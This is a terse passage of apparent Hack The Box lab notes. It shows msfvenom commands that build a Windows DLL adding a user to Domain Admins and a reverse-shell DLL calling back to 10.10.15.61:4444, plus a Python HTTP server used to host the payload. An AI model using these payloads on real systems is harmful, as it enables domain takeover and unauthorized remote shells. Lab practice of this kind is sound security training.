...
```shell-session
xF1NN@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
...
```shell-session
xF1NN@htb[/htb]$ python3 -m http.server 7777
...
---
Created rev shell dll using --

$msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.61 LPORT=4444 -f dll -o reverse.dll

Same steps above but replaced adduser.dll with the reverse.dll